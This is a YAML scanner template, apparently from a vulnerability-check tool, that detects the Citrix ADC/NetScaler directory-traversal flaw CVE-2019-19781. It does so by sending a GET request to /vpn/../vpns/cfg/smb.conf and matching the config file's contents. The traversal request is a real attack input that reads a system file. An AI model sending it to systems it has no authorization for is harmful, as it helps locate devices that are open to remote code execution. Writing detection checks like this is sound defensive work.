app: Citrix
query: body:"citrix"
meta:
  name: citrix-cve-2019-19781-path-traversal
  level: 4
  tags:
    - remote_code_execution
  description: |-
    Citrix ADC（NetScalers）中的目录穿越错误，这个错误会调用perl脚本，perl脚本用于将XML格式的文件附加到受害计算机，因此产生远程执行代码。
    注：Citrix NetScaler ADC应用交付控制器和Citrix NetScaler网关。
  homepage: /vpn/../vpns/cfg/smb.conf
  author: 一曲成殇
  references: https://www.tripwire.com/state-of-security/vert/citrix-netscaler-cve-2019-19781-what-you-need-to-know/
  solution: 更新系统版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /vpn/../vpns/cfg/smb.conf
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: name resolve order
              type: contains
            - name: code
              value: "200"
              type: equals
  create_at: "2021-11-05 23:29:57"
